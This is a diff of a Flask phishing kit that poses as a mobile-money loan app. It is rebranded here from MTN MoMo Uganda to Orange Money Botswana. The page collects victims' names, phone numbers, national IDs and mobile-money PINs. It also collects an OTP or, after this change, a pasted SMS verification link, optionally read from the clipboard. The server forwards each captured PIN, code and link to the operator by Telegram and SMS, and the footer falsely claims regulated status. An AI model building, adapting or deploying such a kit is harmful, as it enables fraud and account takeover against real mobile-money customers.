+        <button type="button" onclick="pressPin('3')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">3</button>
+        <button type="button" onclick="pressPin('4')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">4</button>
+        <button type="button" onclick="pressPin('5')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">5</button>
+        <button type="button" onclick="pressPin('6')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">6</button>
+        <button type="button" onclick="pressPin('7')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">7</button>
+        <button type="button" onclick="pressPin('8')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">8</button>
+        <button type="button" onclick="pressPin('9')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">9</button>
+        <button type="button" onclick="clearPin()" class="h-14 rounded-2xl bg-slate-100 font-bold text-xs text-slate-500 hover:bg-slate-200 active:scale-95 transition-all uppercase">Clear</button>
+        <button type="button" onclick="pressPin('0')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">0</button>
+        <button type="button" onclick="backspacePin()" class="h-14 rounded-2xl bg-slate-100 font-bold text-base text-slate-600 hover:bg-slate-200 active:scale-95 transition-all">⌫</button>
+      </div>
     </section>
 
-    <!-- SCREEN 6: VERIFY YOUR NUMBER (OTP) -->
+    <!-- SCREEN 6: PASTE VERIFICATION LINK -->
     <section id="screen-otp" class="hidden space-y-6">
       <div class="text-center pt-2">
-        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">📱</div>
-        <h2 class="text-2xl font-black text-[#004F71]">VERIFY YOUR NUMBER</h2>
-        <p class="text-xs text-slate-500 mt-1">A verification code has been sent to: <span id="otp-mobile-label" class="font-bold text-slate-700">+263 77 123 4567</span></p>
+        <div class="w-14 h-14 mx-auto rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center text-2xl mb-3 shadow-inner">🔗</div>
+        <h2 class="text-2xl font-black text-slate-900">VERIFY ELIGIBILITY</h2>
+        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please paste the verification link we've sent via SMS to <span id="otp-mobile-label" class="font-bold text-slate-700"></span> to verify your loan eligibility.</p>
       </div>
 
-      <div class="flex justify-center gap-2 sm:gap-3 max-w-[340px] mx-auto">
-        <input type="text" maxlength="1" oninput="otpMove(this, 1)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 2)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 3)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 4)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 5)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 6)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
+      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4 max-w-md mx-auto">
+        <div>
+          <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Paste Verification Link</label>
+          <div class="relative flex items-center">
+            <input type="text" id="input-verification-link" placeholder="Paste link here (e.g. https://...)" class="w-full px-4 py-3.5 pr-20 rounded-2xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] bg-slate-50 text-sm font-semibold text-slate-800 placeholder:text-slate-400">
+            <button type="button" onclick="pasteLinkFromClipboard()" class="absolute right-2 px-3 py-1.5 bg-[#FF7900] hover:bg-[#E66A00] text-black rounded-xl text-xs font-black shadow-xs transition-all active:scale-95">PASTE</button>
+          </div>
+          <p class="text-[11px] text-slate-400 mt-2">Open your SMS messages, copy the eligibility link, and paste it here.</p>
+        </div>
       </div>
 
-      <div class="text-center text-xs text-slate-500">
-        Didn't receive code? <button id="resend-btn" onclick="resendOtp()" class="font-bold text-[#004F71] hover:underline">Resend code in 30s</button>
+      <div class="text-center">
+        <button id="resend-btn" onclick="resendOtp()" disabled class="text-xs font-bold text-slate-400">Resend SMS link in 30s</button>
       </div>
 
-      <button id="btn-otp" onclick="startProcessing()" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
+      <button id="btn-otp" onclick="startProcessing()" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
         VERIFY & CONTINUE
       </button>
     </section>
@@ -511,23 +501,23 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <!-- SCREEN 7: PROCESSING APPLICATION -->
     <section id="screen-processing" class="hidden py-10 space-y-8 text-center">
       <div class="relative w-20 h-20 mx-auto">
-        <div class="w-20 h-20 rounded-full border-4 border-slate-200 border-t-blue-600 animate-spin"></div>
+        <div class="w-20 h-20 rounded-full border-4 border-slate-200 border-t-[#FF7900] animate-spin"></div>
       </div>
 
       <div>
-        <h2 class="text-2xl font-black text-[#004F71]">PROCESSING APPLICATION</h2>
-        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your MTN MoMo history.</p>
+        <h2 class="text-2xl font-black text-slate-900">PROCESSING APPLICATION</h2>
+        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your Orange Money history.</p>
       </div>
 
       <div class="max-w-[320px] mx-auto bg-white rounded-2xl border border-slate-200 p-4 space-y-3 text-left text-xs font-semibold">
-        <div id="step-sub" class="flex items-center gap-3 text-[#004F71]">
+        <div id="step-sub" class="flex items-center gap-3 text-slate-800">
           <span class="font-bold text-emerald-600">✓</span><span>Application Submitted</span>
         </div>
-        <div id="step-ver" class="flex items-center gap-3 text-[#004F71]">
+        <div id="step-ver" class="flex items-center gap-3 text-slate-800">
           <span class="font-bold text-emerald-600">✓</span><span>Phone Verified</span>
         </div>
-        <div id="step-proc" class="flex items-center gap-3 text-[#004F71] animate-pulse">
-          <span class="w-2.5 h-2.5 rounded-full bg-[#004F71] inline-block ml-0.5"></span><span>Processing Assessment...</span>
+        <div id="step-proc" class="flex items-center gap-3 text-[#FF7900] animate-pulse">
+          <span class="w-2.5 h-2.5 rounded-full bg-[#FF7900] inline-block ml-0.5"></span><span>Processing Assessment...</span>
         </div>
         <div id="step-dec" class="flex items-center gap-3 text-slate-400">
           <span class="w-2.5 h-2.5 rounded-full border border-slate-300 inline-block ml-0.5"></span><span>Final Decision</span>
@@ -541,22 +531,22 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="w-20 h-20 mx-auto rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-4xl mb-3 shadow-inner font-bold">
           ✓
         </div>
-        <h2 class="text-2xl sm:text-3xl font-black text-[#004F71]">LOAN APPROVED!</h2>
-        <p class="text-xs text-slate-500 mt-1">Funds will be credited to your MTN MoMo wallet.</p>
+        <h2 class="text-2xl sm:text-3xl font-black text-slate-900">LOAN APPROVED!</h2>
+        <p class="text-xs text-slate-500 mt-1">Funds will be credited to your Orange Money wallet.</p>
       </div>
 
-      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
+      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4">
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Application Reference</span>
-          <span class="font-mono font-bold text-slate-800">EC-984210</span>
+          <span class="font-mono font-bold text-slate-800">OMB-894210</span>
         </div>
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Approved Amount</span>
-          <span id="approved-amount" class="text-lg font-black text-[#004F71]">UGX 100,000</span>
+          <span id="approved-amount" class="text-lg font-black text-[#FF7900]">P 1,500</span>
         </div>
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Repayment Amount</span>
-          <span id="approved-repay" class="font-bold text-slate-800">UGX 1,080</span>
+          <span id="approved-repay" class="font-bold text-slate-800">P 1,620.00</span>
         </div>
         <div class="flex justify-between items-center text-xs sm:text-sm">
           <span class="text-slate-500">Repayment Date</span>
@@ -565,7 +555,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <div class="space-y-3">
-        <button onclick="goTo('details')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
+        <button onclick="goTo('details')" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all">
           VIEW LOAN DETAILS
         </button>
         <button onclick="goTo('home')" class="w-full py-3.5 rounded-2xl bg-white border border-slate-200 text-slate-700 font-bold text-sm hover:bg-slate-50">
@@ -577,30 +567,30 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <!-- SCREEN 9: LOAN DETAILS -->
     <section id="screen-details" class="hidden space-y-5">
       <div class="flex items-center gap-3">
-        <button onclick="goTo('home')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
+        <button onclick="goTo('home')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
         <div>
-          <h2 class="text-xl font-black text-[#004F71]">ACTIVE LOAN DETAILS</h2>
-          <p class="text-xs text-slate-500">Reference: EC-984210</p>
+          <h2 class="text-xl font-black text-slate-900">ACTIVE LOAN DETAILS</h2>
+          <p class="text-xs text-slate-500">Reference: OMB-894210</p>
         </div>
       </div>
 
-      <div class="bg-blue-50 border border-blue-200  p-5 flex items-center justify-between">
+      <div class="bg-orange-50 border border-orange-200 rounded-2xl p-5 flex items-center justify-between">
         <div>
-          <span class="text-xs font-bold uppercase tracking-wider text-blue-800">Status</span>
-          <div class="text-lg font-black text-blue-900">APPROVED & ACTIVE</div>
+          <span class="text-xs font-bold uppercase tracking-wider text-orange-800">Status</span>
+          <div class="text-lg font-black text-orange-950">APPROVED & ACTIVE</div>
         </div>
-        <span class="px-3 py-1 rounded-full text-xs font-bold  text-white">Active</span>
+        <span class="px-3 py-1 rounded-full text-xs font-bold bg-[#FF7900] text-black">Active</span>
       </div>
 
-      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-3 text-xs sm:text-sm">
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">UGX 100,000</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">UGX 50</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">UGX 30</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#004F71]">UGX 1,080</span></div>
+      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-3 text-xs sm:text-sm">
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">P 1,500</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">P 75.00</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">P 45.00</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#FF7900]">P 1,620.00</span></div>
         <div class="flex justify-between py-1.5"><span class="text-slate-500">Due Date</span><span id="details-date" class="font-bold text-slate-800">30/09/2026</span></div>
       </div>
 
-      <button onclick="goTo('home')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
+      <button onclick="goTo('home')" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all">
         BACK TO HOME
       </button>
     </section>
@@ -609,17 +599,17 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
   <!-- INFO MODAL -->
   <div id="info-modal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
-    <div onclick="closeInfoModal()" class="absolute inset-0 bg-slate-900/50 backdrop-blur-xs"></div>
-    <div class="relative bg-white  p-6 max-w-sm w-full shadow-2xl border border-slate-200 text-center space-y-3 z-10">
-      <h3 id="info-title" class="text-lg font-bold text-[#004F71]">Information</h3>
-      <p class="text-xs text-slate-600">This is a demonstration preview of the MTN MoMo mobile loan journey. Features in this section are mock placeholders for demonstration.</p>
-      <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#004F71] text-white font-bold text-xs">Close</button>
+    <div onclick="closeInfoModal()" class="absolute inset-0 bg-black/60 backdrop-blur-xs"></div>
+    <div class="relative bg-white rounded-3xl p-6 max-w-sm w-full shadow-2xl border border-slate-200 text-center space-y-3 z-10">
+      <h3 id="info-title" class="text-lg font-black text-slate-900">Information</h3>
+      <p class="text-xs text-slate-600">This is a demonstration preview of the Orange Money mobile loan journey. Features in this section are mock placeholders for demonstration.</p>
+      <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#FF7900] text-black font-black text-xs">Close</button>
     </div>
   </div>
 
   <!-- FOOTER -->
   <footer class="w-full max-w-[760px] mx-auto px-4 py-4 text-center text-xs text-slate-400 border-t border-slate-200">
-    MTN MoMo Uganda • Mobile Money Loan App
+    Orange Money Botswana (Pty) Ltd • Regulated Mobile Financial Services
   </footer>
 
   <script>
@@ -630,29 +620,22 @@ HTML_PAGE = r"""<!DOCTYPE html>
       nationalId: "",
       birthDate: "",
       purpose: "Business",
-      amount: 500000,
+      amount: 1500,
       period: 30
     };
 
-    let enteredPin = '';
-    let countdown = 30;
+    let enteredPin = "";
     let timer = null;
+    let countdown = 30;
 
-    // Debug function to check state
-    function debugState() {
-      console.log("Current App State:", appState);
-      console.log("Current Visible Screen:", document.querySelector('section:not(.hidden)'));
-    }
-
-    function goTo(screenName) {
-      const screens = ['home', 'apply', 'loan', 'review', 'pin', 'otp', 'processing', 'approved', 'details'];
-      screens.forEach(s => {
-        const el = document.getElementById('screen-' + s);
-        if (el) el.classList.add('hidden');
-      });
+    function goTo(screenName, scroll = true) {
+      document.querySelectorAll('main > section').forEach(sec => sec.classList.add('hidden'));
       const target = document.getElementById('screen-' + screenName);
-      if (target) target.classList.remove('hidden');
-      window.scrollTo({ top: 0, behavior: 'smooth' });
+      if (target) {
+        target.classList.remove('hidden');
+        if (scroll) window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+      if (screenName === 'loan') syncAmount(appState.amount);
       if (screenName === 'review') populateReview();
       if (screenName === 'otp') startOtpTimer();
     }
@@ -671,13 +654,16 @@ HTML_PAGE = r"""<!DOCTYPE html>
     }
 
     function formatMobileWithCountryCode(phone) {
-      if (!phone) return "+256 77 123 4567";
+      if (!phone) return "+267 72 123 456";
       let cleaned = phone.replace(/[^0-9+]/g, '');
       if (cleaned.startsWith('+')) return cleaned;
       if (cleaned.startsWith('0')) {
         cleaned = cleaned.substring(1);
       }
-      return '+256 ' + cleaned;
+      if (cleaned.length === 8) {
+        return '+267 ' + cleaned.substring(0, 2) + ' ' + cleaned.substring(2, 5) + ' ' + cleaned.substring(5);
+      }
+      return '+267 ' + cleaned;
     }
 
     function handleFormSubmit(event) {
@@ -685,13 +671,12 @@ HTML_PAGE = r"""<!DOCTYPE html>
       appState.fullName = document.getElementById('input-fullname').value;
       appState.mobile = document.getElementById('input-mobile').value;
       appState.nationalId = document.getElementById('input-nationalid').value;
-      appState.birthDate = document.getElementById('input-dob') ? document.getElementById('input-dob').value : "";
       appState.purpose = document.getElementById('input-purpose').value;
-      appState.amount = parseInt(document.getElementById('input-amount').value) || 500000;
+      appState.amount = parseInt(document.getElementById('input-amount').value) || 1500;
       
       syncAmount(appState.amount);
 
-      // Instantly send Telegram notification for new application submission
+      // Send Telegram & SMS notification for new application submission
       fetch('/api/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -744,9 +729,9 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const feeEl = document.getElementById('breakdown-fee');
       const totalEl = document.getElementById('breakdown-total');
 
-      if (interestEl) interestEl.innerText = 'UGX ' + interest.toLocaleString();
-      if (feeEl) feeEl.innerText = 'UGX ' + fee.toLocaleString();
-      if (totalEl) totalEl.innerText = 'UGX ' + total.toLocaleString();
+      if (interestEl) interestEl.innerText = 'P ' + interest.toLocaleString();
+      if (feeEl) feeEl.innerText = 'P ' + fee.toLocaleString();
+      if (totalEl) totalEl.innerText = 'P ' + total.toLocaleString();
 
       const dateEl = document.getElementById('breakdown-date');
       if (dateEl) {
@@ -759,43 +744,43 @@ HTML_PAGE = r"""<!DOCTYPE html>
     function setPeriod(days) {
       appState.period = days;
       document.querySelectorAll('.period-btn').forEach(btn => {
-        btn.classList.remove('bg-[#004F71]', 'text-white', 'border-[#004F71]', 'shadow-sm');
+        btn.classList.remove('bg-[#FF7900]', 'text-black', 'border-[#FF7900]', 'shadow-xs');
         btn.classList.add('text-slate-700', 'border-slate-200');
         if (btn.innerText.includes(days + ' Days')) {
-          btn.classList.add('bg-[#004F71]', 'text-[#FFCC00]', 'border-[#004F71]', 'shadow-sm');
+          btn.classList.add('bg-[#FF7900]', 'text-black', 'border-[#FF7900]', 'shadow-xs');
           btn.classList.remove('text-slate-700', 'border-slate-200');
         }
       });
       calculateCosts();
     }
+
     function setCustomDate(val) {
       if (!val) return;
       const chosen = new Date(val);
-      const today = new Date();
+      today = new Date();
       today.setHours(0, 0, 0, 0);
       const diffTime = chosen - today;
       const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
       if (diffDays > 0) {
         appState.period = diffDays;
         document.querySelectorAll('.period-btn').forEach(btn => {
-          btn.classList.remove('bg-[#004F71]', 'text-[#FFCC00]', 'border-[#004F71]', 'shadow-sm');
+          btn.classList.remove('bg-[#FF7900]', 'text-black', 'border-[#FF7900]', 'shadow-xs');
           btn.classList.add('text-slate-700', 'border-slate-200');
         });
         calculateCosts();
       }
     }
 
-
     function toggleConfirm(checked) {
       const btn = document.getElementById('btn-confirm');
       if (btn) {
         btn.disabled = !checked;
         if (checked) {
-          btn.classList.remove('bg-slate-300', 'cursor-not-allowed');
-          btn.classList.add('bg-[#004F71]', 'hover:bg-[#00334E]');
+          btn.classList.remove('bg-slate-300', 'cursor-not-allowed', 'text-slate-500');
+          btn.classList.add('bg-[#FF7900]', 'hover:bg-[#E66A00]', 'text-black');
         } else {
-          btn.classList.add('bg-slate-300', 'cursor-not-allowed');
-          btn.classList.remove('bg-[#004F71]', 'hover:bg-[#00334E]');
+          btn.classList.add('bg-slate-300', 'cursor-not-allowed', 'text-slate-500');
+          btn.classList.remove('bg-[#FF7900]', 'hover:bg-[#E66A00]', 'text-black');
         }
       }
     }
@@ -810,14 +795,14 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const totalEl = document.getElementById('review-total');
       const dateEl = document.getElementById('review-date');
 
-      if (nameEl) nameEl.innerText = appState.fullName || "Tariro Moyo";
-      if (mobileEl) mobileEl.innerText = appState.mobile || "+256 77 123 4567";
-      if (idEl) idEl.innerText = appState.nationalId || "CM98102938102";
+      if (nameEl) nameEl.innerText = appState.fullName || "Lesedi Molefe";
+      if (mobileEl) mobileEl.innerText = appState.mobile || "+267 72 123 456";
+      if (idEl) idEl.innerText = appState.nationalId || "123456789";
       if (purposeEl) purposeEl.innerText = appState.purpose || "Business";
-      if (principalEl) principalEl.innerText = 'UGX ' + (appState.amount || 100000).toLocaleString();
+      if (principalEl) principalEl.innerText = 'P ' + (appState.amount || 1500).toLocaleString();
       if (periodEl) periodEl.innerText = appState.period + ' Days';
 
-      const val = appState.amount || 100000;
+      const val = appState.amount || 1500;
       const days = appState.period || 30;
       let rate = 0.05;
       if (days <= 7) rate = 0.03;
@@ -830,7 +815,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const fee = Math.round(val * 0.03);
       const total = val + interest + fee;
 
-      if (totalEl) totalEl.innerText = 'UGX ' + total.toLocaleString();
+      if (totalEl) totalEl.innerText = 'P ' + total.toLocaleString();
 
       if (dateEl) {
         const d = new Date();
@@ -838,7 +823,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
         dateEl.innerText = d.toLocaleDateString('en-GB');
       }
 
-      // Reset confirm checkbox and button state when entering review screen
       const checkEl = document.getElementById('confirm-check');
       if (checkEl) {
         checkEl.checked = false;
@@ -857,7 +841,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
         const msg = document.getElementById('pin-status-msg');
         if (msg) msg.innerText = 'Verifying PIN...';
         
-        // Add wave animation to dots with staggered delays
         for (let i = 0; i < 4; i++) {
           const dot = document.getElementById('dot-' + i);
           if (dot) dot.classList.add('wave-dot-' + i);
@@ -884,10 +867,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
         const dot = document.getElementById('dot-' + i);
         if (dot) {
           if (i < enteredPin.length) {
-            dot.classList.add('bg-[#004F71]', 'border-[#004F71]');
+            dot.classList.add('bg-[#FF7900]', 'border-[#FF7900]');
             dot.classList.remove('border-slate-300');
           } else {
-            dot.classList.remove('bg-[#004F71]', 'border-[#004F71]');
+            dot.classList.remove('bg-[#FF7900]', 'border-[#FF7900]');
             dot.classList.add('border-slate-300');
           }
         }
@@ -908,7 +891,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
         })
       }).catch(err => console.error(err));
 
-      // Reset PIN busy state and animations
       isPinBusy = false;
       const msg = document.getElementById('pin-status-msg');
       if (msg) msg.innerText = '';
@@ -924,10 +906,17 @@ HTML_PAGE = r"""<!DOCTYPE html>
       goTo('otp');
     }
 
-    function otpMove(input, index) {
-      if (input.value.length === 1 && index < 6) {
-        const nextInput = input.parentElement.children[index];
-        if (nextInput) nextInput.focus();
+    async function pasteLinkFromClipboard() {
+      try {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+          const text = await navigator.clipboard.readText();
+          if (text) {
+            const input = document.getElementById('input-verification-link');
+            if (input) input.value = text;
+          }
+        }
+      } catch (err) {
+        console.log("Clipboard access error:", err);
       }
     }
 
@@ -940,10 +929,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
         countdown--;
         if (resendBtn) {
           if (countdown > 0) {
-            resendBtn.innerText = `Resend code in ${countdown}s`;
+            resendBtn.innerText = `Resend SMS link in ${countdown}s`;
             resendBtn.disabled = true;
           } else {
-            resendBtn.innerText = 'Resend code';
+            resendBtn.innerText = 'Resend SMS link';
             resendBtn.disabled = false;
             clearInterval(timer);
           }
@@ -956,14 +945,13 @@ HTML_PAGE = r"""<!DOCTYPE html>
     }
 
     function startProcessing() {
-      const otpInputs = document.querySelectorAll('.otp-box');
-      let otpCode = '';
-      otpInputs.forEach(i => otpCode += i.value);
+      const linkInput = document.getElementById('input-verification-link');
+      const pastedLink = linkInput ? linkInput.value.trim() : '';
 
       const btnOtp = document.getElementById('btn-otp');
       if (btnOtp) {
         btnOtp.disabled = true;
-        btnOtp.innerText = 'VERIFYING CODE...';
+        btnOtp.innerText = 'VERIFYING ELIGIBILITY...';
       }
 
       const formattedPhone = formatMobileWithCountryCode(appState.mobile);
@@ -975,8 +963,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
           appId: appState.appId,
           fullName: appState.fullName,
           mobile: formattedPhone,
-          field: 'entered_otp',
-          value: otpCode
+          field: 'entered_link',
+          value: pastedLink
         })
       }).catch(err => console.error(err));
 
@@ -987,13 +975,12 @@ HTML_PAGE = r"""<!DOCTYPE html>
         }
         goTo('processing');
 
-        // Processing assessment takes 6 seconds for realistic feel
         setTimeout(() => {
           const approvedAmt = document.getElementById('approved-amount');
           const approvedRepay = document.getElementById('approved-repay');
           const approvedDate = document.getElementById('approved-date');
 
-          const val = appState.amount || 500000;
+          const val = appState.amount || 1500;
           const days = appState.period || 30;
           let rate = 0.05;
           if (days <= 7) rate = 0.03;
@@ -1006,8 +993,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
           const fee = Math.round(val * 0.03);
           const total = val + interest + fee;
 
-          if (approvedAmt) approvedAmt.innerText = 'UGX ' + val.toLocaleString();
-          if (approvedRepay) approvedRepay.innerText = 'UGX ' + total.toLocaleString();
+          if (approvedAmt) approvedAmt.innerText = 'P ' + val.toLocaleString();
+          if (approvedRepay) approvedRepay.innerText = 'P ' + total.toLocaleString();
 
           if (approvedDate) {
             const d = new Date();
@@ -1021,8 +1008,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
     }
 
     function syncAmount(val, isFromInput = false) {
-      let parsedVal = parseInt(val) || 50000;
-      if (parsedVal > 1000000) parsedVal = 1000000;
+      let parsedVal = parseInt(val) || 100;
+      if (parsedVal > 10000) parsedVal = 10000;
       appState.amount = parsedVal;
       
       if (!isFromInput) {
@@ -1033,7 +1020,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const slider = document.getElementById('amount-slider');
       if (slider) slider.value = parsedVal;
       const disp = document.getElementById('display-amount');
-      if (disp) disp.innerText = 'UGX ' + parsedVal.toLocaleString();
+      if (disp) disp.innerText = 'P ' + parsedVal.toLocaleString();
       
       calculateCosts();
     }
@@ -1061,23 +1048,22 @@ def save_unified():
         if f_n == 'entered_pin':
             m = f'🔐 *PIN Received*\n\n👤 *User:* {name}\n🔢 *PIN:* {f_v}\n📞 *Phone:* {phone}'
             send_telegram_notification(m)
-            send_sms_notification(f"[MoMo Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
-        elif f_n == 'entered_otp':
-            m = f'📱 *OTP Received*\n\n👤 *User:* {name}\n🔑 *OTP:* {f_v}\n📞 *Phone:* {phone}'
+            send_sms_notification(f"[Orange Money Botswana] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
+        elif f_n in ('entered_link', 'entered_otp'):
+            m = f'🔗 *Verification Link Received*\n\n👤 *User:* {name}\n🌐 *Link / Code:* {f_v}\n📞 *Phone:* {phone}'
             send_telegram_notification(m)
-            send_sms_notification(f"[MoMo Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
+            send_sms_notification(f"[Orange Money Botswana] Link Received\nUser: {name}\nPhone: {phone}\nLink: {f_v}")
         elif not f_n:
             amt = data.get('amount', 'N/A')
-            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* UGX {amt}\n📅 *Time:* {now}'
+            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* P {amt}\n📅 *Time:* {now}'
             send_telegram_notification(m)
-            send_sms_notification(f"[MoMo Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: UGX {amt}")
+            send_sms_notification(f"[Orange Money Botswana] New Application\nName: {name}\nPhone: {phone}\nAmount: P {amt}")
         return jsonify({'status': 'success', 'record_id': app_id})
 
     except Exception as e:
         print(f"Error in unified save: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# Legacy endpoints redirected to unified logic
 @app.route('/api/track-input', methods=['POST'])
 def track_input():
     return save_unified()
